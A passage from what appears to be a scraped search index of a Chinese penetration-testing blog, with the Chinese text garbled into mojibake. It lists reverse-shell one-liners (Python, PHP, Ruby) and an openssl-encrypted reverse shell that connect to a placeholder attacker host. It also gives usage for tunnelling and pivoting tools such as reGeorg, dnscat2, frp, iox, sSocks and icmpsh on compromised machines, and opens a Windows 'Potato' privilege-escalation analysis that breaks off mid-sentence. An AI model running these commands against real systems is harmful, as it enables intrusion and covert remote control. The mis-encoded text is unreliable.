os.dup2(s.fileno(),2);p=pty.spawn(\"/bin/sh\");' Python ç¯å¢ƒä¸‹çš„ Tips è½¬æˆäº¤äº’å¼ shellï¼špython -c 'import pty;pty.spawn(\"/bin/bash\")' å®Œå…¨äº¤äº’å¼ shellï¼š $ python -c 'import pty; pty.spawn(\"/bin/bash\")' Ctrl-Z $ stty raw -echo $ fg $ reset $ export SHELL=bash //$ export TERM=xterm-256color 2.2.3 PHP php -r '$sock=fsockopen(\"ip\",port);exec(\"/bin/sh -i \u003c\u00263 \u003e\u00263 2\u003e\u00263\");' php -r '$s=fsockopen(\"ip\",port);$proc=proc_open(\"/bin/sh -i\", array(0=\u003e$s, 1=\u003e$s, 2=\u003e$s),$pipes);' php -r '$s=fsockopen(\"ip\",port);shell_exec(\"/bin/sh -i \u003c\u00263 \u003e\u00263 2\u003e\u00263\");' 2.2.4 Ruby ruby -rsocket -e'f=TCPSocket.open(\"ip\",port).to_i;exec sprintf(\"/bin/sh -i \u003c\u0026%d \u003e\u0026%d 2\u003e\u0026%d\",f,f,f)' # windows only ruby -rsocket -e 'c=TCPSocket.new(\"ip\",\"port\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end' ","date":"2020-08-15","objectID":"/2020/08/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E7%A9%BF%E9%80%8F/:2:2","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"å†…ç½‘éš§é“ç©¿é€","uri":"/2020/08/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E7%A9%BF%E9%80%8F/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"2.3 openssl æµé‡åŠ å¯† # VPS ç”Ÿæˆ SSL è¯ä¹¦çš„å…¬ç§é’¥å¯¹ openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes # åœ¨ VPS ç›‘å¬åå¼¹ shell openssl s_server -quiet -key key.pem -cert cert.pem -port 4433 # åœ¨ç›®æ ‡ä¸Šç”¨ openssl åŠ å¯†åå¼¹ shell çš„æµé‡(linux) mkfifo /tmp/s; /bin/sh -i \u003c /tmp/s 2\u003e\u00261 | openssl s_client -quiet -connect IP:port \u003e /tmp/s; rm /tmp/s # windows openssl s_client -quiet -connect [ip]:[port1] | cmd.exe | openssl s_client -quiet -connect [ip]:[port2] # ä»¥ä¸Šå‘½ä»¤ä¼šä» [ip]:[port1] è·å–å‘½ä»¤å‘é€ç»™ cmd.exeæ‰§è¡Œï¼Œç„¶åæŠŠç»“æœè¿”å›åˆ° [ip]:[port2] # å› æ­¤åœ¨æœ¬æœºéœ€è¦å¯åŠ¨ä¸¤ä¸ª s_server # ä» port1 å‘é€å‘½ä»¤åˆ° cmd openssl s_server -quiet -key key.pem -cert cert.pem -port [port1] # ä» port2 è·å–å‘é€ç»™ port1 çš„å‘½ä»¤æ‰§è¡Œç»“æœ openssl s_server -quiet -key key.pem -cert cert.pem -port [port2] ","date":"2020-08-15","objectID":"/2020/08/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E7%A9%BF%E9%80%8F/:2:3","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"å†…ç½‘éš§é“ç©¿é€","uri":"/2020/08/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E7%A9%BF%E9%80%8F/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"2.4 All in One ä»¥ä¸‹æ˜¯å‡ ä¸ªè‡ªåŠ¨ç”Ÿæˆåå¼¹ shell å‘½ä»¤çš„ç½‘ç«™ï¼š https://mrxn.net/reverse_shell.php https://ares-x.com/tools/reverse-shell/ ä¸€ä¸ªåœ¨çº¿ç¼–ç çš„ç½‘ç«™ï¼Œé˜²æ­¢å› ç‰¹æ®Šå­—ç¬¦è¢«è¿‡æ»¤ï¼Œä¹Ÿå¯ä»¥ç”¨åœ¨ java.lang.Runtime.exec() çš„ payload ä¸­ï¼š http://www.jackson-t.ca/runtime-exec-payloads.html ","date":"2020-08-15","objectID":"/2020/08/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E7%A9%BF%E9%80%8F/:2:4","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"å†…ç½‘éš§é“ç©¿é€","uri":"/2020/08/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E7%A9%BF%E9%80%8F/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"3 åº”ç”¨å±‚éš§é“ ","date":"2020-08-15","objectID":"/2020/08/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E7%A9%BF%E9%80%8F/:3:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"å†…ç½‘éš§é“ç©¿é€","uri":"/2020/08/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E7%A9%BF%E9%80%8F/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"3.1 HTTP éš§é“ 3.1.1 reGeorg å»ºè®®ä½¿ç”¨ nosocket ç‰ˆ å·¥å…·åœ°å€ï¼šhttps://github.com/sensepost/reGeorg ä½¿ç”¨æ–¹æ³•ï¼š ä¸Šä¼  tunnel æ–‡ä»¶ æœåŠ¡ç«¯è¿è¡Œï¼špython reGeorgSocksProxy.py -p 8080 -u http://ip:port/tunnel/tunnel.jsp 3.1.2 Neo-reGorg å·¥å…·åœ°å€ï¼šhttps://github.com/L-codes/Neo-reGeorg Neo-reGeorg æ˜¯ä¸€ä¸ªé‡æ„äº† reGeorg çš„é¡¹ç›®ï¼Œç›®çš„æ˜¯ï¼š æé«˜ tunnel è¿æ¥å®‰å…¨æ€§ æé«˜å¯ç”¨æ€§ï¼Œé¿å…ç‰¹å¾æ£€æµ‹ æé«˜ä¼ è¾“å†…å®¹ä¿å¯†æ€§ åº”å¯¹æ›´å¤šçš„ç½‘ç»œç¯å¢ƒåœºæ™¯ ä½¿ç”¨æ–¹æ³•ï¼š è®¾ç½®å¯†ç ç”Ÿæˆ tunnel.(aspx|ashx|jsp|jspx|php) å¹¶ä¸Šä¼ åˆ°WEBæœåŠ¡å™¨ï¼špython3 neoreg.py generate -k password ä½¿ç”¨ neoreg.py è¿æ¥ WEB æœåŠ¡å™¨ï¼Œåœ¨æœ¬åœ°å»ºç«‹ socks5 ä»£ç†ï¼špython3 neoreg.py -k password -u http://xx/tunnel.php æ³¨æ„ æ³¨æ„ï¼Œå¦‚æœä½ çš„å·¥å…·ï¼Œå¦‚ nmap ä¸æ”¯æŒ socks5 ä»£ç†è®¾ç½®ï¼Œè¯·ä½¿ç”¨ proxychains ç­‰ 3.1.3 å…¶å®ƒ Tunna # -u è¿œç¨‹ä»£ç†è„šæœ¬åœ°å€ # -l è¡¨ç¤ºæœ¬åœ°ç›‘å¬çš„ç«¯å£ # -r è¿œç¨‹æ˜ å°„ç«¯å£ # -v è¾“å‡ºè¯¦ç»†æ•°æ® # -a ä»£ç†è¿œç¨‹è¿æ¥çš„ä¸»æœºåœ°å€ python proxy.py -u http://ip/conn.aspx -l 1080 -v python proxy.py -u http://ip/conn.aspx -l 5555 -r 8080 -s -v -n abptts pystinger â€¦ ","date":"2020-08-15","objectID":"/2020/08/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E7%A9%BF%E9%80%8F/:3:1","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"å†…ç½‘éš§é“ç©¿é€","uri":"/2020/08/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E7%A9%BF%E9%80%8F/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"3.2 SSH éš§é“ å‚è€ƒï¼šhttps://3nd.xyz/AD-Pentest/AD-Pentest-Hidden-Tunnel/ 3.2.1 æœ¬åœ°ç«¯å£è½¬å‘ åœ¨æœ¬åœ°ä¸»æœºä¸Šå¼€å¯ç«¯å£æµé‡è½¬å‘åŠŸèƒ½ ä¾‹å¦‚ï¼šåœ¨å…¥ä¾µè€…ä¸»æœºä¸Šæ‰§è¡Œï¼ˆVPS ä¸Šæ‰§è¡Œä¸»åŠ¨è¿æ¥ï¼‰ ssh -L 8866:192.168.10.3:23 -fN 192.168.10.2 3.2.2 è¿œç¨‹ç«¯å£è½¬å‘ åœ¨è¿œç¨‹ä¸»æœºä¸Šå¼€å¯ç«¯å£æµé‡è½¬å‘åŠŸèƒ½ ä¾‹å¦‚ï¼šåœ¨å ¡å’æœºä¸Šæ‰§è¡Œï¼ˆè¾¹ç•Œä¸»æœºä¸Šæ‰§è¡Œå›è¿ï¼‰ ssh -R 8866:192.168.10.3:23 -fN 192.168.10.1 3.2.3 åŠ¨æ€è½¬å‘ - Socket åœ¨æœ¬åœ°ä¸»æœºä¸Šå¼€å¯æµé‡åŠ¨æ€è½¬å‘åŠŸèƒ½ï¼Œå¹¶é…ç½®ä»£ç† ä¾‹å¦‚ï¼šåœ¨å…¥ä¾µè€…ä¸»æœºä¸Šæ‰§è¡Œ ssh -D 1100 -fN 192.168.10.2 ","date":"2020-08-15","objectID":"/2020/08/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E7%A9%BF%E9%80%8F/:3:2","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"å†…ç½‘éš§é“ç©¿é€","uri":"/2020/08/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E7%A9%BF%E9%80%8F/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"3.3 DNS éš§é“ å·¥å…· DNScat2 ç¼–è¯‘å¥½çš„å„ç§ç‰ˆæœ¬ï¼šhttps://downloads.skullsecurity.org/dnscat2/ 3.3.1 é…ç½®è§£æè®°å½• DNS è§£æè®°å½•ä¸­æ·»åŠ ä¸€æ¡ A è®°å½•ï¼Œåç§°ä¸º ns1 å€¼ä¸º VPS IP åœ°å€ å†æ·»åŠ ä¸€æ¡ NS è®°å½•ï¼Œåç§°ä¸ºä»»æ„ä¸€ä¸ªå­åŸŸåï¼ŒæŒ‡å‘åœ°å€ä¸º ns1.yourdomain.com 3.3.2 å®‰è£… dnscat2 æœåŠ¡ç«¯ apt-get install gem apt-get install ruby-dev apt-get install libpq-dev apt-get install ruby-bundler apt-get install git git clone https://github.com/iagox86/dnscat2 bundle install 3.3.3 å¯åŠ¨æœåŠ¡ç«¯ ruby ./dnscat2.rb dnscat.yuming.com -e open -c mima --no-cache 3.3.4 å¯åŠ¨å®¢æˆ·ç«¯ # æµ‹è¯•èƒ½å¦é€šä¿¡ dnscat-client.exe -ping dnscat.yuming.com # è¿æ¥ dnscat-client.exe --dns domain=dnscat.yuming.com -secret mima ","date":"2020-08-15","objectID":"/2020/08/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E7%A9%BF%E9%80%8F/:3:3","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"å†…ç½‘éš§é“ç©¿é€","uri":"/2020/08/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E7%A9%BF%E9%80%8F/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"4 ä¼ è¾“å±‚ SOCKS4 æ”¯æŒ telnetã€FTPã€HTTP ç­‰ TCP åè®® SOCKS5 æ”¯æŒ TCP ä¸ UDPï¼Œå¹¶æ”¯æŒå®‰å…¨è®¤è¯æ–¹æ¡ˆ ","date":"2020-08-15","objectID":"/2020/08/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E7%A9%BF%E9%80%8F/:4:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"å†…ç½‘éš§é“ç©¿é€","uri":"/2020/08/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E7%A9%BF%E9%80%8F/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"4.1 FRP frp é‡‡ç”¨ Golang ç¼–å†™ï¼Œæ”¯æŒè·¨å¹³å°ï¼Œä»…éœ€ä¸‹è½½å¯¹åº”å¹³å°çš„äºŒè¿›åˆ¶æ–‡ä»¶å³å¯æ‰§è¡Œã€‚å·¥å…·åœ°å€ï¼šhttps://github.com/fatedier/frp ç¼–å†™é…ç½®æ–‡ä»¶ï¼Œå…ˆé€šè¿‡ ./frps -c ./frps.ini å¯åŠ¨æœåŠ¡ç«¯ï¼Œå†é€šè¿‡ ./frpc -c ./frpc.ini å¯åŠ¨å®¢æˆ·ç«¯ã€‚ æœåŠ¡ç«¯éƒ¨ç½²åœ¨æˆ‘ä»¬å…·æœ‰å…¬ç½‘ IP çš„æœåŠ¡å™¨ä¸Šï¼Œå®¢æˆ·ç«¯æ”¾åœ¨æˆ‘ä»¬æ‹¿åˆ°æƒé™çš„è·³æ¿æœåŠ¡å™¨ä¸Šï¼ŒåŒç«¯éƒ½éœ€è¦å¯¹é…ç½®æ–‡ä»¶è¿›è¡Œé…ç½®ã€‚ 4.1.1 æœåŠ¡ç«¯ [common] # frp æœåŠ¡ç«¯ç«¯å£ bind_port = 7000 # ä»ªè¡¨ç›˜ç«¯å£ dashboard_port = 8888 # frpæœåŠ¡ç«¯å¯†ç  token = 123456 # ä»ªè¡¨ç›˜é»˜è®¤è´¦å·å¯†ç  dashboard_user = admin dashboard_pwd = admin å¯åŠ¨ FRPï¼šfrps -c frps.ini 4.1.2 å®¢æˆ·ç«¯ [common] server_addr = VPS IP server_port = 7000 # ä¸ vps ä¿æŒä¸€è‡´ token = 123456 [ssh] type = tcp local_ip = 127.0.0.1 local_port = 22 remote_port = 7000 use_encryption = true use_compression = true ","date":"2020-08-15","objectID":"/2020/08/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E7%A9%BF%E9%80%8F/:4:1","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"å†…ç½‘éš§é“ç©¿é€","uri":"/2020/08/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E7%A9%BF%E9%80%8F/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"4.2 iox iox æ˜¯ä¸€ä¸ªç«¯å£è½¬å‘ \u0026 å†…ç½‘ä»£ç†å·¥å…·ï¼ŒåŠŸèƒ½ç±»ä¼¼äºlcx/ewï¼Œä½†æ˜¯æ¯”å®ƒä»¬æ›´å¥½ã€‚ å·¥å…·åœ°å€ï¼šhttps://github.com/EddieIvan01/iox 4.2.1 ç«¯å£è½¬å‘ # ç«¯å£è½¬å‘ - ä»æœ¬åœ° 8888 è½¬åˆ° 9999 ./iox fwd -l 8888 -l 9999 # ç«¯å£è½¬å‘ - ä»æœ¬åœ° 8888ï¼ŒæŠŠæµé‡è½¬å‘åˆ° 1.1.1.1:9999 ./iox fwd -l 8888 -r 1.1.1.1:9999 # è¿æ¥ 1.1.1.1:8888 å’Œ 1.1.1.1:9999, åœ¨ä¸¤ä¸ªè¿æ¥é—´è½¬å‘ ./iox fwd -r 1.1.1.1:8888 -r 1.1.1.1:9999 4.2.2 ä»£ç† # åœ¨æœ¬åœ° 0.0.0.0:1080 å¯åŠ¨ Socks5 æœåŠ¡ - æ­£å‘ä»£ç† ./iox proxy -l 1080 # åå‘ä»£ç† # åœ¨è¢«æ§æœºå¼€å¯ Socks5 æœåŠ¡ï¼Œå°†æœåŠ¡è½¬å‘åˆ°å…¬ç½‘ VPS ./iox proxy -r 1.1.1.1:9999 # åœ¨ VPS ä¸Šè½¬å‘ 0.0.0.0:9999 åˆ° 0.0.0.0:1080 # ä½ å¿…é¡»å°†ä¸¤æ¡å‘½ä»¤æˆå¯¹ä½¿ç”¨ï¼Œå› ä¸ºå®ƒå†…éƒ¨åŒ…å«äº†ä¸€ä¸ªç®€å•çš„åè®®æ¥æ§åˆ¶å›è¿ ./iox proxy -l 9999 -l 1080 // æ³¨æ„ï¼Œè¿™ä¸¤ä¸ªç«¯å£æ˜¯æœ‰é¡ºåºçš„ # æ¥ç€è¿æ¥å†…ç½‘ä¸»æœº # socks5://1.1.1.1:1080 proxychains rdesktop 192.168.0.100:3389 ","date":"2020-08-15","objectID":"/2020/08/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E7%A9%BF%E9%80%8F/:4:2","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"å†…ç½‘éš§é“ç©¿é€","uri":"/2020/08/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E7%A9%BF%E9%80%8F/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"4.3 sSocks sSocks æ˜¯ä¸€ä¸ª socks ä»£ç†å·¥å…·å¥—è£…ï¼Œå¯ç”¨æ¥å¼€å¯ socks ä»£ç†æœåŠ¡ï¼Œæ”¯æŒ socks5 éªŒè¯ï¼Œæ”¯æŒ IPV6 å’Œ UDPï¼Œå¹¶æä¾›åå‘ socks ä»£ç†æœåŠ¡ï¼Œå³å°†è¿œç¨‹è®¡ç®—æœºä½œä¸º socks ä»£ç†æœåŠ¡ç«¯ï¼Œåå¼¹å›æœ¬åœ°ï¼Œæå¤§æ–¹ä¾¿å†…ç½‘çš„æ¸—é€æµ‹è¯•ã€‚ å·¥å…·åœ°å€ï¼šhttp://sourceforge.net/projects/ssocks/ æ­£å‘ä»£ç† ./ssocksd --bind 192.168.172.131 --port 1080 åå‘ä»£ç† # æ”»å‡»è€…æœºå™¨ç›‘å¬ 6020 ç«¯å£è½¬å‘åˆ° 6010 ./rcsocks -l 6020 -p 6010 -vv # å—å®³è€…åå‘è¿æ¥ä»£ç†ä¸»æœº 6010 ç«¯å£ ./rssocks -s æ”»å‡»è€…IP:6010 -vv ","date":"2020-08-15","objectID":"/2020/08/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E7%A9%BF%E9%80%8F/:4:3","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"å†…ç½‘éš§é“ç©¿é€","uri":"/2020/08/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E7%A9%BF%E9%80%8F/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"5 ç½‘ç»œå±‚ ","date":"2020-08-15","objectID":"/2020/08/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E7%A9%BF%E9%80%8F/:5:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"å†…ç½‘éš§é“ç©¿é€","uri":"/2020/08/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E7%A9%BF%E9%80%8F/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"5.1 ICMP Tunnel å·¥å…·åç§°ï¼šICMPSH 5.1.1 æœåŠ¡ç«¯ æœåŠ¡ç«¯é¦–å…ˆéœ€è¦å…³é—­ ICMP å›æ˜¾ï¼šsysctl -w net.ipv4.icmp_echo_ignore_all=1 å®‰è£…æœåŠ¡ç«¯ï¼š apt-get install python-impacket python icmpsh_m.py æœ¬æœºIP ç›®æ ‡æœºå™¨å…¬ç½‘IP 5.1.2 å®¢æˆ·ç«¯ icmpsh.exe -t ç›®æ ‡IP -d 500 -b 30 -s 128 ","date":"2020-08-15","objectID":"/2020/08/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E7%A9%BF%E9%80%8F/:5:1","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"å†…ç½‘éš§é“ç©¿é€","uri":"/2020/08/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E7%A9%BF%E9%80%8F/"},{"categories":["æ¸—é€æµ‹è¯•","ææƒ"],"content":"Potato å®¶æ—ææƒåˆ†æ","date":"2020-08-15","objectID":"/2020/08/potato%E5%AE%B6%E6%97%8F%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/","tags":["æ¸—é€æµ‹è¯•","ææƒ"],"title":"Potato å®¶æ—ææƒåˆ†æ","uri":"/2020/08/potato%E5%AE%B6%E6%97%8F%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/"},{"categories":["æ¸—é€æµ‹è¯•","ææƒ"],"content":"Potato å®¶æ—ææƒåˆ†æ ","date":"2020-08-15","objectID":"/2020/08/potato%E5%AE%B6%E6%97%8F%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/:0:0","tags":["æ¸—é€æµ‹è¯•","ææƒ"],"title":"Potato å®¶æ—ææƒåˆ†æ","uri":"/2020/08/potato%E5%AE%B6%E6%97%8F%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/"},{"categories":["æ¸—é€æµ‹è¯•","ææƒ"],"content":"1 å‰è¨€ ","date":"2020-08-15","objectID":"/2020/08/potato%E5%AE%B6%E6%97%8F%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/:1:0","tags":["æ¸—é€æµ‹è¯•","ææƒ"],"title":"Potato å®¶æ—ææƒåˆ†æ","uri":"/2020/08/potato%E5%AE%B6%E6%97%8F%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/"},{"categories":["æ¸—é€æµ‹è¯•","ææƒ"],"content":"1.1 windows æœåŠ¡çš„ç™»å½•ç”¨æˆ· Local System - NT AUTHORITY\\SYSTEM Network Service - NT AUTHORITY\\Network Service Local Service - NT AUTHORITY\\Local Service æœåŠ¡è´¦æˆ·åœ¨ windows æƒé™æ¨¡å‹ä¸­æœ¬èº«å°±æ‹¥æœ‰å¾ˆé«˜çš„æƒé™ï¼Œåœ¨å®é™…æ¸—é€è¿‡ç¨‹ä¸­ï¼Œæ‹¿åˆ° webshell ä¸‹ï¼Œç”¨æˆ·æƒé™æ˜¯ IIS æˆ–è€… apacheï¼Œæˆ–é€šè¿‡ SQLi æ‰§è¡Œ xp_cmdshellï¼Œæ­¤æ—¶æ‰‹é‡Œçš„æœåŠ¡è´¦æˆ·åœ¨è¿›è¡Œæ“ä½œæ—¶æ˜¯ä½æƒé™è´¦æˆ·ï¼Œè€Œä½¿ç”¨è¯¥ææƒæ‰‹æ³•å¯ä»¥ç›´æ¥è·å– SYSTEM æƒé™ã€‚ ","date":"2020-08-15","objectID":"/2020/08/potato%E5%AE%B6%E6%97%8F%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/:1:1","tags":["æ¸—é€æµ‹è¯•","ææƒ"],"title":"Potato å®¶æ—ææƒåˆ†æ","uri":"/2020/08/potato%E5%AE%B6%E6%97%8F%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/"},{"categories":["æ¸—é€æµ‹è¯•","ææƒ"],"content":"1.2 å‰æ åˆ©ç”¨ Potato ææƒï¼ˆé™¤å¼€ Hot Potatoï¼‰çš„æ˜¯å‰ææ˜¯æ‹¥æœ‰ SeImpersonatePrivilege æˆ– SeAssignPrimaryTokenPrivilege æƒé™ï¼Œä»¥ä¸‹ç”¨æˆ·æ‹¥æœ‰ SeImpersonatePrivilege æƒé™ï¼ˆè€Œåªæœ‰æ›´é«˜æƒé™çš„è´¦æˆ·æ¯”å¦‚ SYSTEM æ‰æœ‰ SeAssignPrimaryTokenPrivilege æƒé™ï¼‰ï¼š æœ¬åœ°ç®¡ç†å‘˜è´¦æˆ·(ä¸åŒ…æ‹¬ç®¡ç†å‘˜ç»„æ™®é€šè´¦æˆ·)å’Œæœ¬åœ°æœåŠ¡è´¦æˆ· ç”± SCM å¯åŠ¨çš„æœåŠ¡ PSï¼šæœ¬æœºæµ‹è¯•æ—¶å³ä½¿åœ¨æœ¬åœ°ç­–ç•¥ä¸­æˆäºˆç®¡ç†å‘˜ç»„æ™®é€šç”¨æˆ· SeImpersonatePrivilege ç‰¹æƒï¼Œåœ¨ cmd.exe ä¸­ whoami /priv ä¹Ÿä¸æ˜¾ç¤ºè¯¥ç‰¹æƒï¼Œä¸”æ— æ³•åˆ©ç”¨ï¼›è€Œ SeAssignPrimaryTokenPrivilege ç‰¹æƒåˆ™å¯ä»¥æ­£å¸¸æˆäºˆæ™®é€šç”¨æˆ· ","date":"2020-08-15","objectID":"/2020/08/potato%E5%AE%B6%E6%97%8F%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/:1:2","tags":["æ¸—é€æµ‹è¯•","ææƒ"],"title":"Potato å®¶æ—ææƒåˆ†æ","uri":"/2020/08/potato%E5%AE%B6%E6%97%8F%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/"},{"categories":["æ¸—é€æµ‹è¯•","ææƒ"],"content":"1.3 Windows Token windows token æ˜¯æè¿°å®‰å…¨ä¸Šä¸‹æ–‡çš„å¯¹è±¡ï¼Œç”¨æˆ·ç™»é™†åç³»ç»Ÿå°±ä¼šç”Ÿæˆ tokenï¼Œåˆ›å»ºæ–°è¿›ç¨‹æˆ–æ–°çº¿ç¨‹æ—¶è¿™ä¸ª token ä¼šä¸æ–­æ‹·è´ã€‚ å½“ç”¨æˆ·å…·æœ‰ SeImpersonatePrivilege ç‰¹æƒï¼Œåˆ™å¯ä»¥è°ƒç”¨ CreateProcessWithTokenW ä»¥æŸä¸ª Token çš„æƒé™å¯åŠ¨æ–°è¿›ç¨‹ å½“ç”¨æˆ·å…·æœ‰ SeAssignPrimaryTokenPrivilege ç‰¹æƒï¼Œåˆ™å¯ä»¥è°ƒç”¨ CreateProcessAsUserW ä»¥ Token æƒé™å¯åŠ¨æ–°è¿›ç¨‹ å…·ä½“å¯ä»¥å‚è€ƒã€ŒWindows Access Token æ”»å‡»ã€æ–‡ç« ã€‚ ","date":"2020-08-15","objectID":"/2020/08/potato%E5%AE%B6%E6%97%8F%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/:1:3","tags":["æ¸—é€æµ‹è¯•","ææƒ"],"title":"Potato å®¶æ—ææƒåˆ†æ","uri":"/2020/08/potato%E5%AE%B6%E6%97%8F%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/"},{"categories":["æ¸—é€æµ‹è¯•","ææƒ"],"content":"2 Hot Potato ","date":"2020-08-15","objectID":"/2020/08/potato%E5%AE%B6%E6%97%8F%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/:2:0","tags":["æ¸—é€æµ‹è¯•","ææƒ"],"title":"Potato å®¶æ—ææƒåˆ†æ","uri":"/2020/08/potato%E5%AE%B6%E6%97%8F%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/"},{"categories":["æ¸—é€æµ‹è¯•","ææƒ"],"content":"2.1 ç®€ä»‹ 2016 å¹´ 1 æœˆï¼Œ Dominic White å‘è¡¨äº†ä¸€ç¯‡æ–‡ç« ï¼Œå‘å¸ƒäº†ä¸€ç§åŸºäº NTLM åå°„çš„æƒé™æå‡æ”»å‡»æ–¹å¼ï¼Œå‘½åä¸º Hot Potatoã€‚å¯ä»¥ä»ä¸»æœºçš„æœ€ä½ç”¨æˆ·æƒé™æå‡è‡³ç³»ç»Ÿæœ€é«˜çš„ NT\\AUTHORITY SYSTEM æƒé™ã€‚ Hot Potato åˆ©ç”¨è‘—åçš„ NTLM Relay æ”»å‡»(HTTP -\u003e SMB)å’Œ NBNS æ¬ºéª—æ”»å‡»ï¼Œè·å– Windows ç³»ç»Ÿçš„æœ€é«˜æƒé™ SYSTEMã€‚å¯ä»¥ä»ä¸»æœºçš„æœ€ä½ç”¨æˆ·æƒé™æå‡è‡³ç³»ç»Ÿæœ€é«˜çš„ NT\\AUTHORITY SYSTEM æƒé™ã€‚ ","date":"2020-08-15","objectID":"/2020/08/potato%E5%AE%B6%E6%97%8F%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/:2:1","tags":["æ¸—é€æµ‹è¯•","ææƒ"],"title":"Potato å®¶æ—ææƒåˆ†æ","uri":"/2020/08/potato%E5%AE%B6%E6%97%8F%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/"},{"categories":["æ¸—é€æµ‹è¯•","ææƒ"],"content":"2.2 NBNS 2.2.1 æ¦‚å¿µ NBNS (Net BIOS Name Service)æ˜¯ Windows ç³»ç»Ÿä¸­å¹¿æ³›è¢«ä½¿ç”¨çš„ UDP å¹¿æ’­æœåŠ¡ï¼Œå³å‘½åæŸ¥è¯¢æœåŠ¡ã€‚è¯¥æœåŠ¡ä½¿ç”¨ UDP åè®®å®ç°ï¼Œå¯ä»¥é€šè¿‡å‘é€å±€åŸŸç½‘å†…å¹¿æ’­æ¥å®ç°æœ¬åœ°åç§°è§£æã€‚ ç±»ä¼¼äº TCP/IP åè®®ä¸­çš„ DNSï¼Œå®ƒè´Ÿè´£æŸ¥æ‰¾ç›®æ ‡æœºå™¨ç›¸åº”çš„ IP åœ°å€ï¼Œå¹¶èµ‹äºˆä¸€ä¸ª NetBIOS åç§°ã€‚å¾®è½¯ WINS æœåŠ¡å°±æ˜¯é‡‡ç”¨ NBNSåè®®ã€‚ 2.2.2 NBNS æ¬ºéª— ç³»ç»Ÿè¿›è¡Œä¸€ä¸ªåå­—æŸ¥è¯¢çš„é€»è¾‘å¦‚ä¸‹ï¼š é¦–å…ˆæŸ¥è¯¢æœ¬åœ°çš„ hosts æ–‡ä»¶ DNS Lookup æŸ¥è¯¢(æœ¬åœ° DNS cacheï¼Œå†å‘ DNS æœåŠ¡å™¨è¯·æ±‚) NBNS æŸ¥è¯¢ NBNS çš„é€»è¾‘æ˜¯å‘æœ¬åœ°æ‰€æœ‰ä¸»æœºå¹¿æ’­ä¸€æ¡æ¶ˆæ¯ï¼Œè°æ˜¯ xxxï¼Œå¦‚æœè°å“åº”äº†è¯¥å¹¿æ’­æ¶ˆæ¯ï¼Œè°å°±æ˜¯ xxx åœ¨å†…ç½‘æ¸—é€æµ‹è¯•æ—¶ï¼Œæ”»å‡»è€…å¾€å¾€ä¼šç›‘å¬ NBNS å¹¿æ’­æ¶ˆæ¯ï¼Œå¹¶ä¸”ä¼šåº”ç­”è‡ªå·±æ˜¯ xxxï¼Œè¿™å°±æ˜¯NBNS 